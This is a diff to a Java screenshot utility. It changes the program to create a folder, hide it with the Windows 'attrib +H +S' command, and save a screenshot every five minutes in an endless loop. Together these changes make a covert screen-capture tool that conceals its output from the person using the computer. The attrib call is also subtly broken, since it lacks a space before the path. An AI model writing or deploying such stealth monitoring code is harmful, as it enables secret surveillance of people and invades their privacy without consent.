@@ -31,10 +31,17 @@ public class ScreenShotService {
     
     public static void main(String[] args) throws InterruptedException, AWTException, IOException {
         // TODO code application logic here
-        String picturesPath = "D:" + File.separator + "test";
+        String picturesPath = "D:" + File.separator + "4okoloko";
         
-        //while(true)
-        //{
+        // creating directory
+        File pictureDir = new File(picturesPath);
+        pictureDir.mkdir();
+        
+        // making it hidden (using cmd commands)
+        Runtime.getRuntime().exec("attrib +H +S" + picturesPath);
+        
+        while(true)
+        {
             Date now = new Date();
             String nowString = now.toString().replace(':','_');
             
@@ -59,8 +66,8 @@ public class ScreenShotService {
             
             ImageIO.write(screenShot, "png", outputFile);
             
-            //Thread.sleep(300000); // 5 minutes in miliseconds
-        //}
+            Thread.sleep(300000); // 5 minutes in miliseconds
+        }
     }
     
     public static void stop()
